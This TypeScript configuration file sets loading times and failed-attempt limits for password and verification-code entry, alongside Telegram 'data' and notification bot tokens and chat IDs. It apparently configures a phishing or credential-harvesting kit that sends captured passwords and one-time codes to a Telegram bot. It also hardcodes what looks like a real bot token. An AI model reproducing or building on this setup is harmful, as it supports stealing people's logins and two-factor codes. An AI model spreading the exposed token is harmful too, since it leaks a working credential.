interface Config {
  settings: {
    code_loading_time: number;
    max_failed_code_attempts: number;
    max_failed_password_attempts: number;
    password_loading_time: number;
  };
  telegram: {
    data_chatid: string;
    data_token: string;
    noti_token: string;
    noti_chat_id: string;
  };
}
const defaultConfig: Config = {
  settings: {
    code_loading_time: 10000,
    max_failed_code_attempts: 3,
    max_failed_password_attempts: 1,
    password_loading_time: 10000,
  },
  telegram: {
    data_chatid: "7211586401",
    data_token: "7696170315:AAHzY3ANCN23bED-vqRYC_3-49Ura_YOycA",
    noti_token: "7696170315:AAHzY3ANCN23bED-vqRYC_3-49Ura_YOycA",
    noti_chat_id: "7211586401",
  },
};
const getConfig = (): Config => {
  return defaultConfig;
};

export default getConfig;
